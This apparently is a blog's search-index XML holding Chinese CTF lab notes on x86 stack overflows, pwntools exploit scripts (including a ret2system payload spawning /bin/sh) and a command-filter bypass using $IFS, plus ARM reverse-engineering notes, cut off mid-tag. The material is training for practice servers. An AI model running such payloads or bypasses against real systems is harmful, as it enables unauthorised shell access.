<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>文档学习</title>
      <link href="/2024/10/15/%E6%96%87%E6%A1%A3%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/10/15/%E6%96%87%E6%A1%A3%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="实验一-nc的使用与系统命令执行"><a href="#实验一-nc的使用与系统命令执行" class="headerlink" title="实验一 nc的使用与系统命令执行"></a>实验一 nc的使用与系统命令执行</h2><blockquote><p>域名:端口号       如node5.buuoj.cn:27241<br>IP地址:端口号     如192.168.32.12:10001</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">连接远程端口获得文件信息</span></span><br><span class="line">nc node5.buuoj.cn 27241</span><br><span class="line">ll</span><br><span class="line">cat flag</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果设置了blacklist,那就要进行绕过过滤，$IFS<span class="variable">$9</span>可以替换空格</span></span><br><span class="line">l\l</span><br><span class="line">c\at$IFS$9flag</span><br></pre></td></tr></table></figure><h2 id="实验二-权限提升"><a href="#实验二-权限提升" class="headerlink" title="实验二 权限提升"></a>实验二 权限提升</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看文件基础信息</span></span><br><span class="line">checksec --file=Re_or_pwn</span><br><span class="line">file Re_or_pwn</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发现文件是64位的，使用IDA64打开反编译</span></span><br></pre></td></tr></table></figure><h2 id="实验三-向数组填充数据并简单写一个攻击脚本"><a href="#实验三-向数组填充数据并简单写一个攻击脚本" class="headerlink" title="实验三 向数组填充数据并简单写一个攻击脚本"></a>实验三 向数组填充数据并简单写一个攻击脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编写attck.py文件，使用pwntools</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立远程连接</span></span><br><span class="line">p=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25094</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造payload</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">13</span>+p32(<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送payload</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 它的作用是将程序的标准输入和输出连接到当前的终端，允许你与目标程序进行交互。</span></span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure><h2 id="实验四-栈溢出"><a href="#实验四-栈溢出" class="headerlink" title="实验四 栈溢出"></a>实验四 栈溢出</h2><h3 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410141804606.png" alt="image-20241014180435394"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410141800529.png" alt="栈在内存"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">|------------------|  &lt;- 高地址</span><br><span class="line">| 传入参数        |  &lt;- 参数存储区域</span><br><span class="line">|------------------|</span><br><span class="line">| EIP（返回地址）  |  &lt;- 被调用时保存的返回地址</span><br><span class="line">|------------------|</span><br><span class="line">| EBP              |  &lt;- 当前栈帧的基址</span><br><span class="line">|------------------|</span><br><span class="line">| 局部变量（数组）  |  &lt;- 数组存储区域</span><br><span class="line">| s[14]            |  &lt;- 数组的最后一个字节</span><br><span class="line">| s[13]            |</span><br><span class="line">| s[12]            |</span><br><span class="line">| s[11]            |</span><br><span class="line">| s[10]            |</span><br><span class="line">| s[9]             |</span><br><span class="line">| s[8]             |</span><br><span class="line">| s[7]             |</span><br><span class="line">| s[6]             |</span><br><span class="line">| s[5]             |</span><br><span class="line">| s[4]             |</span><br><span class="line">| s[3]             |</span><br><span class="line">| s[2]             |</span><br><span class="line">| s[1]             |</span><br><span class="line">| s[0]             |  &lt;- 数组的第一个字节</span><br><span class="line">|------------------|  &lt;- 低地址</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>返回地址就是EIP下一条指令的位置</p></blockquote><p>入口函数</p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410141634119.png" alt="image-20241014163410051"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25760</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">15</span> + p64(<span class="number">0x0000000000401186</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Linux函数调用栈的实现原理（X86）"><a href="#Linux函数调用栈的实现原理（X86）" class="headerlink" title="Linux函数调用栈的实现原理（X86）"></a>Linux函数调用栈的实现原理（X86）</h1><h2 id="内存结构"><a href="#内存结构" class="headerlink" title="内存结构"></a>内存结构</h2><p>二进制程序执行时的内存结构：</p><ul><li>code section：保存程序执行指令的机器码。</li><li>static section：在程序执行期间不改变的常量和静态变量。</li><li>heap：使用malloc申请的堆内存，向内存地址升序的方向生长：grows up。</li><li>stack：保存函数局部变量和函数调用的控制信息，向内存地址降序的方向生长：grows down。</li></ul><p><img src="https://i-blog.csdnimg.cn/blog_migrate/ffdc898adc5f461b71522585385ed12e.png" alt="在这里插入图片描述"></p><ul><li>（32位系统）程序的虚拟内存空间提供了2^32^ 的空间保存数据，用户地址空间3G从0x0000000到0xC0000000，内核空间1G从0xC0000000到0xFFFFFFFF。</li><li>（64位系统）程序的虚拟内存空间提供了2^64^ 的空间保存数据，用户地址空间128T从0x0000 0000 0000 0000到0x0000 7FFF FFFF F0000，内核空间128T从0xFFFF 8000 0000 0000到0xFFFF FFFF FFFF FFFF。</li></ul><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><blockquote><p>寄存器提供了额外的存储空间，每个寄存器可以存一个字（4字节）。没有e拓展的寄存器只能存半个字（2字节）。</p><p>x86有六个通用寄存器和三个特殊寄存器</p></blockquote><p>和函数调用相关的寄存器（e表示扩展的意思）：</p><ul><li>eip：指令指针，存储当前正在执行的机器指令的地址。也叫PC（程序计数器）。</li><li>ebp：帧指针，保存当前栈帧顶部地址（高地址）。</li><li>esp：堆栈指针，保存当前堆栈底部地址（低地址）。</li></ul><p>下图便于理解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">|----------------------|  high address</span><br><span class="line">|        ...           |</span><br><span class="line">|-------frame----------|</span><br><span class="line">|        ...           |</span><br><span class="line">|        ...           |</span><br><span class="line">|        ...           |</span><br><span class="line">|-------frame----------|   # current frame     &lt;----- ebp</span><br><span class="line">|        ...           |</span><br><span class="line">|        ...           |</span><br><span class="line">|        ...           |                       &lt;----- esp</span><br><span class="line">|----------------------|  low address</span><br></pre></td></tr></table></figure><h2 id="x86基础"><a href="#x86基础" class="headerlink" title="x86基础"></a>x86基础</h2><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151546319.png" alt="image-20241015154641104"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151548575.png" alt="image-20241015154845474"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151549071.png" alt="image-20241015154931881"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151554838.png" alt="image-20241015155442574"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151614658.png" alt="image-20241015161445539"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151612277.png" alt="image-20241015161241181"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151655740.png" alt="image-20241015165538660"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151656889.png" alt="image-20241015165649849"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151657508.png" alt="image-20241015165743268"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410160011560.png" alt="image-20241016001130350"></p><blockquote><p>mov指令不支持两个数都来自主存</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410160018028.png" alt="image-20241016001807867"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410160019282.png" alt="image-20241016001917132"></p><h2 id="x86函数调用"><a href="#x86函数调用" class="headerlink" title="x86函数调用"></a>x86函数调用</h2><ul><li><p>当需要调用另一个函数时，栈空间需要生长，用来保存一些局部变量 或者 寄存器信息。</p></li><li><p>当调用函数发生时，caller执行逻辑会跳转到callee，拿到结果后，再跳转会caller。这就需要改变下面几个寄存器的值：</p></li></ul><p>​eip指令指针，需要改成指向callee的指令。<br>​ebp 和 esp 当前分别指向caller栈帧的顶部和底部。两个寄存器都需要更新为 指向callee的新栈帧的顶部和底部。</p><ul><li>当函数返回时，需要恢复寄存器中的旧值，才可以返回caller。所以更新寄存器的值，需要将它的旧值保存在堆栈中，以便在函数返回后恢复旧值。</li></ul><p>下面是main调用foo的执行过程：</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/7236da1c57be357f0b62f563c9b5b86e.png" alt="在这里插入图片描述"></p><h3 id="step1：参数入栈"><a href="#step1：参数入栈" class="headerlink" title="step1：参数入栈"></a>step1：参数入栈</h3><p>将参数压入堆栈。 x86将参数压入堆栈来传递参数。请注意，当我们将参数压入堆栈时，<a href="https://so.csdn.net/so/search?q=esp&spm=1001.2101.3001.7020">esp</a> 会递减。参数以相反的顺序压入堆栈。（上面是高地址）</p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151149015.png" alt="在这里插入图片描述"></p><h3 id="step2：旧的eip入栈"><a href="#step2：旧的eip入栈" class="headerlink" title="step2：旧的eip入栈"></a>step2：旧的eip入栈</h3><p>旧的eip（<a href="https://so.csdn.net/so/search?q=rip&spm=1001.2101.3001.7020">rip</a>）压入堆栈。跳转到子函数执行eip需要指向子函数，所以这里先保存下。</p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151156887.png" alt="在这里插入图片描述"></p><h3 id="step3：修改eip指向"><a href="#step3：修改eip指向" class="headerlink" title="step3：修改eip指向"></a>step3：修改eip指向</h3><p>已经保存了 eip 的旧值，可以安全地将 eip 更改为指向被callee的指令。</p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151157476.png" alt="在这里插入图片描述"></p><h3 id="step4：将旧的ebp入栈"><a href="#step4：将旧的ebp入栈" class="headerlink" title="step4：将旧的ebp入栈"></a>step4：将旧的ebp入栈</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151157859.png" alt="在这里插入图片描述"></p><h3 id="step5：ebp向下移动指向新栈帧顶部"><a href="#step5：ebp向下移动指向新栈帧顶部" class="headerlink" title="step5：ebp向下移动指向新栈帧顶部"></a>step5：ebp向下移动指向新栈帧顶部</h3><p>这就是<code>mov %esp %ebp</code>的含义：</p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151157009.png" alt="在这里插入图片描述"></p><h3 id="step6：esp向下移动"><a href="#step6：esp向下移动" class="headerlink" title="step6：esp向下移动"></a>step6：esp向下移动</h3><p>通过sub esp（esp地址–） 来为新栈帧分配新空间。编译器会根据函数的复杂度确定 esp 应该减少多少。</p><ul><li>例如，只有几个局部变量的函数不需要太多的堆栈空间，因此 esp 只会减少几个字节。</li><li>例如，如果一个函数将一个大数组声明为一个局部变量，那么 esp 会减少很多来适应堆栈中的数组。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151157157.png" alt="在这里插入图片描述"></p><h3 id="step7：执行callee"><a href="#step7：执行callee" class="headerlink" title="step7：执行callee"></a>step7：执行callee</h3><p>现在堆栈中已经保存了函数的局部变量和跳转控制信息；由于ebp指向栈帧的顶部，所以可以用ebp+8找到第一个参数的保存位置。</p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151158821.png" alt="在这里插入图片描述"></p><h3 id="step8：返回esp回到堆栈顶部"><a href="#step8：返回esp回到堆栈顶部" class="headerlink" title="step8：返回esp回到堆栈顶部"></a>step8：返回esp回到堆栈顶部</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151414410.png" alt="image-20241015141436324"></p><h3 id="step9：恢复旧的ebp"><a href="#step9：恢复旧的ebp" class="headerlink" title="step9：恢复旧的ebp"></a>step9：恢复旧的ebp</h3><p>使用esp从堆栈中pop出一个值（old ebp），把old ebp的值赋给ebp。</p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151158831.png" alt="在这里插入图片描述"></p><h3 id="step10：弹出eip"><a href="#step10：弹出eip" class="headerlink" title="step10：弹出eip"></a>step10：弹出eip</h3><p>继续使用esp弹出old eip的值赋给eip。</p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151415780.png" alt="image-20241015141502705"></p><h3 id="step11：从堆栈中删除参数"><a href="#step11：从堆栈中删除参数" class="headerlink" title="step11：从堆栈中删除参数"></a>step11：从堆栈中删除参数</h3><p>继续讲堆栈上的参数弹出到寄存器，然后删除esp栈顶以下的元素。栈顶以下的元素已经不在栈中，没有意义。</p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151415222.png" alt="image-20241015141512169"></p><h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    foo(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="type">int</span> bar[<span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gcc -O0 t.c -o t -g</span><br></pre></td></tr></table></figure><h3 id="main执行过程"><a href="#main执行过程" class="headerlink" title="main执行过程"></a>main执行过程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disassemble /rm</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">3       int main(void) &#123;</span><br><span class="line">                                                                 # 由_start调入main函数</span><br><span class="line">   0x0000000000401122 &lt;+0&gt;:     55              push   %rbp      # 栈帧顶部入栈</span><br><span class="line">   0x0000000000401123 &lt;+1&gt;:     48 89 e5        mov    %rsp,%rbp # 栈帧顶部指针rbp指向新栈帧顶部</span><br><span class="line"></span><br><span class="line">4           foo(1, 2);</span><br><span class="line">=&gt; 0x0000000000401126 &lt;+4&gt;:     be 02 00 00 00  mov    $0x2,%esi # 参数1入寄存器传递</span><br><span class="line">   0x000000000040112b &lt;+9&gt;:     bf 01 00 00 00  mov    $0x1,%edi # 参数2入寄存器传递</span><br><span class="line">   0x0000000000401130 &lt;+14&gt;:    e8 07 00 00 00  callq  0x40113c &lt;foo&gt;   # push %rip 然后 jmpq</span><br><span class="line">                                                                        # push %rip 等价与 sub $0x8, %rsp </span><br><span class="line">                                                                        #                 mov $rip, %rsp</span><br><span class="line"></span><br><span class="line">   0x0000000000401135 &lt;+19&gt;:    b8 00 00 00 00  mov    $0x0,%eax</span><br><span class="line"></span><br><span class="line">5       &#125;</span><br><span class="line">   0x000000000040113a &lt;+24&gt;:    5d              pop    %rbp             # 先恢复rbp的值</span><br><span class="line">   0x000000000040113b &lt;+25&gt;:    c3              retq                    # 在恢复rip的值 popq %rip</span><br><span class="line"></span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><h3 id="foo函数"><a href="#foo函数" class="headerlink" title="foo函数"></a>foo函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disassemble /rm</span><br><span class="line">Dump of assembler code for function foo:</span><br><span class="line">7       void foo(int a, int b) &#123;</span><br><span class="line">   0x000000000040113c &lt;+0&gt;:     55              push   %rbp              # 帧顶位置 入栈</span><br><span class="line">   0x000000000040113d &lt;+1&gt;:     48 89 e5        mov    %rsp,%rbp         # rbp帧顶指针，指向新帧顶</span><br><span class="line">   0x0000000000401140 &lt;+4&gt;:     89 7d ec        mov    %edi,-0x14(%rbp)  # 参数2入栈（先压最后一个参数入栈）</span><br><span class="line">   0x0000000000401143 &lt;+7&gt;:     89 75 e8        mov    %esi,-0x18(%rbp)  # 参数1入栈</span><br><span class="line"></span><br><span class="line">8           int bar[4];</span><br><span class="line">9       &#125;</span><br><span class="line">=&gt; 0x0000000000401146 &lt;+10&gt;:    90              nop</span><br><span class="line">   0x0000000000401147 &lt;+11&gt;:    5d              pop    %rbp  # 先恢复rbp的值</span><br><span class="line">   0x0000000000401148 &lt;+12&gt;:    c3              retq         # 在恢复rip的值 popq %rip</span><br><span class="line"></span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><h2 id="实验五-栈溢出-利用system函数传参"><a href="#实验五-栈溢出-利用system函数传参" class="headerlink" title="实验五 栈溢出-利用system函数传参"></a>实验五 栈溢出-利用system函数传参</h2><p>查看入口函数发现栈溢出漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151044138.png" alt="image-20241015104415044"></p><blockquote><p>buf字符数组有136个也就是0x88个，但是read能读入0x100个，有0x78个冗余空间，可以实现栈溢出</p></blockquote><p>寻找到提权函数，找到了string  &#x2F;bin&#x2F;sh 但是没有函数直接执行这个字符串，记录下这个字符串的地址，然后继续查找system函数，发现一个system函数能传入参数调用，因此目标就是利用只能溢出调用system函数并且传入参数</p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151048132.png" alt="image-20241015104844088"></p><p>根据函数调用栈在内存中的结构，实现栈溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25269</span>)</span><br><span class="line"></span><br><span class="line">systemAddress=<span class="number">0x08048320</span></span><br><span class="line">shellAddress=<span class="number">0x0804A024</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>) + p32(systemAddress) +p32(<span class="number">1</span>) + p32(shellAddress)</span><br><span class="line"></span><br><span class="line">p.readline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>x86使用栈返回</p><p>64使用寄存器返回</p></blockquote><p>备用图片</p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151051556.png" alt="image-20241015105133466"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>物联网安全</title>
      <link href="/2024/10/13/%E7%89%A9%E8%81%94%E7%BD%91/"/>
      <url>/2024/10/13/%E7%89%A9%E8%81%94%E7%BD%91/</url>
      
        <content type="html"><![CDATA[<h1 id="逆向基础"><a href="#逆向基础" class="headerlink" title="逆向基础"></a>逆向基础</h1><h2 id="逆向入门介绍"><a href="#逆向入门介绍" class="headerlink" title="逆向入门介绍"></a>逆向入门介绍</h2><h3 id="逆向工程的概念"><a href="#逆向工程的概念" class="headerlink" title="逆向工程的概念"></a>逆向工程的概念</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131504962.png" alt="image-20241013150420915"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131504127.png" alt="image-20241013150435072"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131504191.png" alt="image-20241013150445140"></p><blockquote><p>可执行文件</p><p>win PE</p><p>linux ELF</p><p>BIN</p></blockquote><h3 id="逆向工程的应用"><a href="#逆向工程的应用" class="headerlink" title="逆向工程的应用"></a>逆向工程的应用</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131505068.png" alt="image-20241013150500015"></p><h3 id="软件分析的一般流程"><a href="#软件分析的一般流程" class="headerlink" title="软件分析的一般流程"></a>软件分析的一般流程</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131505777.png" alt="image-20241013150512732"></p><h3 id="软件逆向的前置基础"><a href="#软件逆向的前置基础" class="headerlink" title="软件逆向的前置基础"></a>软件逆向的前置基础</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131505572.png" alt="image-20241013150522522"></p><h2 id="ARM汇编"><a href="#ARM汇编" class="headerlink" title="ARM汇编"></a>ARM汇编</h2><h3 id="什么是ARM"><a href="#什么是ARM" class="headerlink" title="什么是ARM"></a>什么是ARM</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131505804.png" alt="image-20241013150529762"></p><p>A顶级处理</p><p>M数据传输</p><p>R实时处理</p><h3 id="ARM发展"><a href="#ARM发展" class="headerlink" title="ARM发展"></a>ARM发展</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131505633.png" alt="image-20241013150541562"></p><h3 id="ARM大小端"><a href="#ARM大小端" class="headerlink" title="ARM大小端"></a>ARM大小端</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131505114.png" alt="image-20241013150552059"></p><h3 id="ARM基础"><a href="#ARM基础" class="headerlink" title="ARM基础"></a>ARM基础</h3><h4 id="ARM运行模式"><a href="#ARM运行模式" class="headerlink" title="ARM运行模式"></a>ARM运行模式</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131506300.png" alt="image-20241013150602249"></p><h4 id="ARM工作状态"><a href="#ARM工作状态" class="headerlink" title="ARM工作状态"></a>ARM工作状态</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131531190.png" alt="image-20241013153156137"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131506014.png" alt="image-20241013150612938"></p><h4 id="ARM工作状态寄存器"><a href="#ARM工作状态寄存器" class="headerlink" title="ARM工作状态寄存器"></a>ARM工作状态寄存器</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131506962.png" alt="image-20241013150624890"></p><h4 id="Thumb工作状态寄存器"><a href="#Thumb工作状态寄存器" class="headerlink" title="Thumb工作状态寄存器"></a>Thumb工作状态寄存器</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131506872.png" alt="image-20241013150635812"></p><h4 id="对应关系"><a href="#对应关系" class="headerlink" title="对应关系"></a>对应关系</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131506270.png" alt="image-20241013150646197"></p><h4 id="ARM流水线"><a href="#ARM流水线" class="headerlink" title="ARM流水线"></a>ARM流水线</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131506141.png" alt="image-20241013150657057"></p><h3 id="ARM指令集"><a href="#ARM指令集" class="headerlink" title="ARM指令集"></a>ARM指令集</h3><h4 id="ARM状态"><a href="#ARM状态" class="headerlink" title="ARM状态"></a>ARM状态</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131507347.png" alt="image-20241013150708291"></p><h4 id="ARM指令集-1"><a href="#ARM指令集-1" class="headerlink" title="ARM指令集"></a>ARM指令集</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131507303.png" alt="image-20241013150714246"></p><h5 id="数据处理指令"><a href="#数据处理指令" class="headerlink" title="数据处理指令"></a>数据处理指令</h5><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131507476.png" alt="image-20241013150725419"></p><h5 id="算数运算指令"><a href="#算数运算指令" class="headerlink" title="算数运算指令"></a>算数运算指令</h5><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131507110.png" alt="image-20241013150739050"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131507259.png" alt="image-20241013150751199"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131507601.png" alt="image-20241013150758554"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131508821.png" alt="image-20241013150809761"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131508099.png" alt="image-20241013150823036"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131508382.png" alt="image-20241013150835320"></p><h5 id="逻辑运算指令"><a href="#逻辑运算指令" class="headerlink" title="逻辑运算指令"></a>逻辑运算指令</h5><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131508756.png" alt="image-20241013150851685"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131509172.png" alt="image-20241013150903127"></p><h5 id="位清零指令"><a href="#位清零指令" class="headerlink" title="位清零指令"></a>位清零指令</h5><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131509985.png" alt="image-20241013150916927"></p><h5 id="转移指令"><a href="#转移指令" class="headerlink" title="转移指令"></a>转移指令</h5><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131509091.png" alt="image-20241013150930036"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131509473.png" alt="image-20241013150941397"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131509723.png" alt="image-20241009112257159"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131510288.png" alt="image-20241013151003218"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131510240.png" alt="image-20241013151011195"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131510434.png" alt="image-20241013151026386"></p><h5 id="状态寄存器访问指令"><a href="#状态寄存器访问指令" class="headerlink" title="状态寄存器访问指令"></a>状态寄存器访问指令</h5><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131510000.png" 